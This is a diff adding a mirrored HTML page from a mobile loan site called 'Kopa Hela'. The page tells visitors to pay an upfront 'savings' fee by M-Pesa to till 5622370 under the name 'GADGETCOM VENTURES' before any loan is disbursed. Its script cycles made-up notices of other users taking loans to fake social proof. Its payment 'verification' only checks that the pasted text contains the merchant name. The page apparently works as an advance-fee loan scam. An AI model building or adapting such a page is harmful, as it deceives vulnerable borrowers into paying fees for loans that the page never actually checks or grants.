@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from Kopa-Hela.vercel.app/Verification.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 21 May 2025 13:13:16 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loan Eligibility</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            /*background: linear-gradient(135deg, #555ab1, #070930);*/
+            background: linear-gradient(135deg, #209bde, #94b155);
+            /*background-color: #f2f8fc;*/
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        .logo-circle {
+            width: 30px;
+            height: 30px;
+            background-color: #cdf4d0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .bolt {
+            color: #00c853;
+            font-size: 1.2em;
+        }
+
+        .dark-mode {
+            background: #cdf4d0;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        h1 {
+            font-size: 1.0em;
+            text-align: center;
+            margin: 30px 0;
+            margin-top: + 15%;
+            font-weight: bold;
+        }
+
+        h2 {
+            font-size: 1.2em;
+            text-align: center;
+            margin: 30px 20px;
+            margin-top: + 25%;
+            border-radius: 5px;
+            width: 70%;
+            margin-left: 15%;
+            color: white;
+        }
+
+        h4 {
+            font-size: 0.8em;
+            text-align: center;
+            margin: 30px 20px;
+            margin-top: 0.5%;
+            border-radius: 5px;
+            width: 100%;
+            margin-left: 0%;
+            color: white;
+        }
+
+        h3 {
+            font-size: 0.1em;
+            text-align: center;
+            margin: 30px 0;
+            margin-top: -10%;           
+        }
+
+        h5 {
+            font-size: 0.8em;
+            margin: 30px 0;
+            margin-left: 5%;
+            margin-top: -5%;
+        }
+
+        h6 {
+            font-size: 1.1em;
+            margin: 30px 0;
+            margin-left: 5%;
+        }
+
+        .loan-message {
+            background: linear-gradient(135deg, #55b194, #070930);
+            padding: 2px;
+            border-radius: 12px;
+            margin: 2px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            height: 10%;
+            margin-top: 4.5%;
+        }
+
+        .loan-messages {
+            background-color: transparent;
+            padding: 1px;
+            border-radius: 12px;
+            margin: 2px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-top: 0.5%;
+            height: 4%;
+        }
+
+        .verify-button {
+            background: linear-gradient(135deg, #55b194, #071c30);
+            color: white;
+            font-size: 1.2em;
+            padding: 12px 20px;
+            border-radius: 52px;
+            margin: 10px 0;
+            margin-left: 10%;
+            font-weight: bold;
+            width: 80%;
+            border: none;
+
+            border: none;
+            width: 80%;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin: 10px 0;
+            margin-left: 10%;
+            font-weight: bold;
+        }
+
+        .verify-buttons {
+            background: #05a247;
+            color: white;
+            /*padding: 12px 20px;*/
+            border-radius: 25px;
+            border: none;
+            width: 100%;
+            align-self: center;
+            align-items: center;
+            align-content: center;
+            font-size: 1em;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+
+        .loan-table {
+            background: #ddeefa;
+            border-radius: 12px;
+            border-color: #000000;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-top: -7%;
+            width: 90%;
+            margin-left: 5%;
+        }
+
+        .loan-tabless {
+            background: #ddeefa;
+            border-radius: 12px;
+            border-color: #000000;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-top: +5%;
+            width: 100%;
+            margin-left: 0.5%;
+        }
+
+        .loan-table div {
+            display: flex;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .loan-table div:last-child {
+            border-bottom: none;
+        }
+
+        .loan-table .label {
+            flex: 1;
+            padding: 15px;
+            background: #ddeefa;
+            color: #000000;    
+            width: 100%;        
+        }
+
+        .loan-table .labels {
+            flex: 1;
+            padding: 15px;
+            background: #ddeefa51;
+            color: #000000;
+            width: 100%;
+        }
+
+        .loan-table .value {
+            flex: 1;
+            padding: 15px;
+            color: #333;
+        }
+
+        .loan-tables div {
+            display: flex;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .loan-tables div:last-child {
+            border-bottom: none;
+        }
+
+        .loan-tabless .label {
+            flex: 1;
+            padding: 15px;
+            background: #ddeefa;
+            color: #000000;            
+        }
+
+        .loan-tabless .labels {
+            flex: 1;
+            padding: 11px;
+            background: #ddeefa51;
+            color: #000000;
+            width: 100%;
+        }
+
+        .loan-tabless .value {
+            flex: 1;
+            padding: 11px;
+            color: #333;
+        }
+
+        .status-pending {
+            background: #ad6721;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 15px;
+            display: inline-block;
+        }
+
+        .status-not-verified {
+            background: #e6061d;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 15px;
+            display: inline-block;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: wheat;
+        }
+
+        .open-modal-btn {
+
+
+            
+            /*margin-top: 20px;*/
+            
+
+            background: linear-gradient(135deg, greenyellow, green);
+            color: black;
+            font-size: 1.0em;
+            padding: 8px 10px;
+            border-radius: 12px;
+            margin: 10px 0;
+            margin-left: 5%;
+            font-weight: bold;
+            width: 90%;
+            border: none;
+            cursor: pointer;
+        }
+
+        .confirm-btn:hover {
+            background: #00b34a;
+        }
+
+        /**************************************/
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1;
+        }
+
+        .modal {
+            background: linear-gradient(135deg, #55b194, #072830);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: transparent;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        p {
+            color: white;
+            margin-bottom: 1.5rem;
+            line-height: 1.5;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            margin-bottom: 1rem;
+            font-size: 1rem;
+            align-items: center;
+            align-self: center;
+            text-align: center;
+            align-content: center;
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, greenyellow, green);
+            color: #070930;
+            font-size: 1.2em;
+            padding: 12px 20px;
+            border-radius: 52px;
+            margin: 10px 0;
+            margin-left: 10%;
+            font-weight: bold;
+            width: 80%;
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .verify-btnn {
+            background: linear-gradient(135deg, greenyellow, green);
+            color: #070930;
+            font-size: 0.8em;
+            padding: 12px 20px;
+            border-radius: 52px;
+            /*margin: 10px 0;*/
+            margin-left: 35%;
+            font-weight: bold;
+            width: 60%;
+            border: none;
+            cursor: pointer;
+            /*transition: background 0.2s;*/
+        }
+
+        .verify-btn:hover {
+            background: linear-gradient(135deg, green, greenyellow);
+        }
+
+        .message {
+            display: none;
+            margin-top: 1rem;
+            padding: 0.8rem;
+            border-radius: 6px;
+            text-align: center;
+        }
+
+        .success {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+
+        .error {
+            background: #ffebee;
+            color: #c62828;
+        }
+    </style>
+</head>
+<body>
+<h3>.</h3>
+<div class="loan-messages">
+    <h4 id="scrollmsg" style="background: linear-gradient(135deg, rgb(255, 255, 255), white); color: #070930;" >🔊     0724***689 loaned KES 8,390... 2 mins ago</h4>
+</div>
+    <div class="loan-message">
+    <!--h4 id="scrollmsg" style="background: linear-gradient(135deg, rgb(255, 255, 255), white); color: #070930;" >User 0724***689 loaned KES 8,390... 2 mins ago</h4-->
+        <h1 style="color: greenyellow;"> ACCOUNT SAVINGS </h1>
+        <h5 style="color: rgb(253, 252, 252);"> Based on your selected loan amount of <strong id="limit">Ksh 7,000</strong>, GADGETCOM VENTURES requires you to save <strong id="savingsamount">Ksh 160</strong> (Selected Savings Plan) to your Kopa Hela account. This helps strengthen your credit profile. Your savings will be withdrawable exclusively upon successful completion of your first loan repayment cycle.</h5>
+    </div>
+    <div class="labels" >
+        <button class="verify-btnn" onclick="window.location.href = 'savings.html'" id="copytill" style="margin-top: 5%; color: orangered; background: linear-gradient(135deg, #31463f, #070930); font-size: medium;">Change Savings Plan</button>
+    </div>
+    <div class="loan-tabless">
+        <div>
+            <div class="labels" ><span style="margin-left: 5%;"><strong>How to save to your Kopa Hela A/C:</strong></span></div>
+            <!--div class="labels" id="user-name">Wei bwana</div-->
+        </div>
+        <div>
+            <div class="labels" >Go to M~Pesa : <span style="margin-left: 5.5%;"> <strong>M~pesa</strong></span></div>
+            <!--div class="labels" id="user-name"></div-->
+        </div>
+        <div>
+            <div class="labels" >Lipa na M~Pesa :<span style="margin-left: 3%;"> <strong>Buy Goods & Services</strong></span></div>
+            <!--div class="labels" id="user-name">Wei bwana</div-->
+        </div>
+        <div>
+            <div class="labels" >Enter Till Number :<span style="margin-left: 2%;"> <strong>5622370</strong></span></div>
+            <!--div class="labels" id="user-name">Wei bwana</div-->
+        </div>
+        <div>
+            <div class="labels" >
+                <button class="verify-btnn" onclick="copyTillNumber()" id="copytill">CLICK TO COPY TILL</button>
+            </div>
+            <!--div class="labels" id="user-name">Wei bwana</div-->
+        </div>
+        <div>
+            <div class="labels" >Enter Amount :<span style="margin-left: 13%;"> <strong id="savingsamountt">Ksh 160</strong></span></div>
+            <!--div class="labels" id="user-name">Wei bwana</div-->
+        </div>
+        <div>
+            <div class="labels" >Complete Payment :<span style="margin-left: 3%;"> <strong>Enter M~Pesa Pin</strong></span></div>
+            <!--div class="labels" id="user-name">Wei bwana</div-->
+        </div>
+
+        <button class="open-modal-btn" onclick="goToSecondPage()">Verify Payment to Initiate Loan Disbursement</button>
+    </div>
+
+    <!---------------------------------------------------------------------------->
+    <div class="card">
+        <p id="paragraph"></p>
+    </div>
+    <div class="overlay">
+        <div class="modal">
+            <button class="close-btn" onclick="closeModals()">&times;</button>
+            <h2>Verify Payments</h2>
+            <p>Copy the entire confirmation message you received from M-PESA after making payments and paste in the text field below then click verify button</p>
+            
+            <textarea 
+                class="input-field" 
+                placeholder="Paste M-PESA Message Here"
+                rows="4"
+            ></textarea>
+            
+            <button class="verify-btn" onclick="verifyTransaction()">VERIFY</button>
+            
+            <div id="message" class="message"></div>
+        </div>
+    </div>
+    <!---------------------------------------------------------------------------->
+
+<!--/div-->
+
+    <div class="footer">
+        © Kopa Hela 2025
+    </div>
+
+    <script>
+        let limit = document.getElementById('limit');
+        let savingsamount = document.getElementById('savingsamount');
+        let savingsamountt = document.getElementById('savingsamountt');
+        let lims = 0.00
+        lims = parseFloat(localStorage.getItem('limit'));    
+        let savingamount = 0.00
+        savingamount = parseFloat(localStorage.getItem('saveamount')); 
+        let savingamountt = 0.00
+        savingamountt = parseFloat(localStorage.getItem('saveamount'));    
+        limit.textContent = "Ksh " + (lims.toFixed(2)); 
+        limit.innerHTML = '<b>' + limit.innerHTML + '</b>';
+        savingsamount.textContent = "Ksh " + (savingamount.toFixed(2)); 
+        savingsamount.innerHTML = '<b>' + savingsamount.innerHTML + '</b>';
+        savingsamountt.textContent = "Ksh " + (savingamountt.toFixed(2)); 
+        savingsamountt.innerHTML = '<b>' + savingsamountt.innerHTML + '</b>';
+
+
+
+
+
+        
+
+
+
+
+        //----------------------------------------------------------------
+        //const name = localStorage.getItem("name") || "John Doe";
+        //document.getElementById("usernames").textContent = name + ", ";
+        const openModalBtn = document.querySelector('.open-modal-btn');
+        const overlay = document.querySelector('.overlay');
+        const modal = document.querySelector('.modal');
+        const closeBtn = document.querySelector('.close-btn');
+
+        openModalBtn.addEventListener('click', () => {
+            overlay.style.display = 'flex';
+            modal.style.display = 'block';
+        });
+
+        closeBtn.addEventListener('click', closeModals);
+        //overlay.addEventListener('click', closeModal);
+
+        function closeModal() {
+            overlay.style.display = 'none';
+            modal.style.display = 'none';
+            window.location.href = 'reviewpage.html';
+            localStorage.setItem('review', 'true');
+        }
+
+        function closeModals() {
+            overlay.style.display = 'none';
+            modal.style.display = 'none';
+            //window.location.href = 'reviewpage.html';
+        }
+
+        function verifyTransaction() {
+            const input = document.querySelector('.input-field').value;
+            const messageDiv = document.getElementById('message');
+            
+            messageDiv.style.display = 'block';
+            
+            const name = "GADGETCOM VENTURES";
+            
+            if ((input.trim().length > 0) &&(input.includes(name))) {
+                messageDiv.className = 'message success';
+                messageDiv.textContent = 'Transaction verification successful!';
+                closeModal();
+            } else {
+                messageDiv.className = 'message error';
+                messageDiv.textContent = 'Please enter a valid message';
+            }
+        }
+
+        function copyTillNumber() {
+    const tillNumber = '5622370';
+    navigator.clipboard.writeText(tillNumber).then(() => {
+        document.getElementById('copytill').innerText = "Till number copied!"
+        document.getElementById('copytill').style.color = 'black';
+        showToast("Till number copied to clipboard");
+    }).catch(err => {
+        console.error('Failed to copy text: ', err);
+    });
+}
+    </script>
+    <!------------------------------>
+
+    <script>
+
+
+        window.onload = function () {
+            setTimeout(() => {
+               // if (!hasSeenInstallPrompt) {
+                //scrollmsg.textContent = "`";
+               // }
+            //}, 2200); 
+        // Countdown Timer
+        let timeLeft = 1; // Countdown starting from 5 seconds
+        const scrollmsg = document.getElementById('scrollmsg');
+        //const contin = document.getElementById('continueBtn');
+
+        function updateTimer() {
+            //scrollmsg.textContent = "";
+            if (timeLeft >= 16) {
+                clearInterval(timerInterval);
+                // Optionally disable buttons or change state after countdown ends
+                scrollmsg.textContent = "✔ Approved";
+                //contin.style.display = 'block';
+                //contin.display = ;          
+                
+            } else {   
+                setTimeout(() => {
+               // if (!hasSeenInstallPrompt) {
+                scrollmsg.textContent = "`";
+               // }
+            }, 2200); 
+
+                timeLeft++;                
+                if (timeLeft == 2){
+                    scrollmsg.textContent = "🔊     0724***689 loaned KES 8,390... 2 mins ago";
+                } else if (timeLeft == 3) {
+                    scrollmsg.textContent = "🔊     0701***111 loaned KES 8,500... 7 mins ago";
+                } else if (timeLeft == 4) {
+                    scrollmsg.textContent = "🔊     0745***122 loaned KES 6,495... 36 mins ago";
+                } else if (timeLeft == 5) {
+                    scrollmsg.textContent = "🔊     0708***343 loaned KES 4,890... 4 mins ago";
+                } else if (timeLeft == 6) {
+                    scrollmsg.textContent = "🔊     0711***602 loaned KES 6,000... 5 mins ago";
+                } else if (timeLeft == 7) {
+                    scrollmsg.textContent = "🔊     0797***630 loaned KES 6,090... 21 mins ago";
+                } else if (timeLeft == 8) {
+                    scrollmsg.textContent = "🔊     0700***091 loaned KES 15,050... 14 mins ago";
+                } else if (timeLeft == 9) {
+                    scrollmsg.textContent = "🔊     0711***368 loaned KES 11,300... 11 mins ago";
+                } else if (timeLeft == 10) {
+                    scrollmsg.textContent = "🔊     0720***142 loaned KES 9,500... 27 mins ago";
+                } else if (timeLeft == 11) {
+                    scrollmsg.textContent = "🔊     0710***177 loaned KES 6,400... 1 min ago";
+                } else if (timeLeft == 12) {
+                    scrollmsg.textContent = "🔊     0794***081 loaned KES 5,005... 8 mins ago";
+                } else if (timeLeft == 13) {
+                    scrollmsg.textContent = "🔊     0705***699 loaned KES 7,000... 30 mins ago";
+                } else if (timeLeft == 14) {
+                    scrollmsg.textContent = "🔊     0724***004 loaned KES 7,050... 12 mins ago";
+                } else if (timeLeft == 15) {
+                    scrollmsg.textContent = "🔊     0710***831 loaned KES 5,390... 23 mins ago";
+                    timeLeft = 0;
+                }
+                
+            }
+            //scrollmsg.textContent = "";
+        }
+        scrollmsg.textContent = "`";
+        const timerInterval = setInterval(updateTimer, 3800);
+    }, 2000);
+        }
+        
+    </script>
+    <!--script src="loan-details.js"></script-->
+    <!--script src="index.js"></script-->
+</body>
+
+<!-- Mirrored from Kopa-Hela.vercel.app/Verification.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 21 May 2025 13:13:17 GMT -->
+</html>
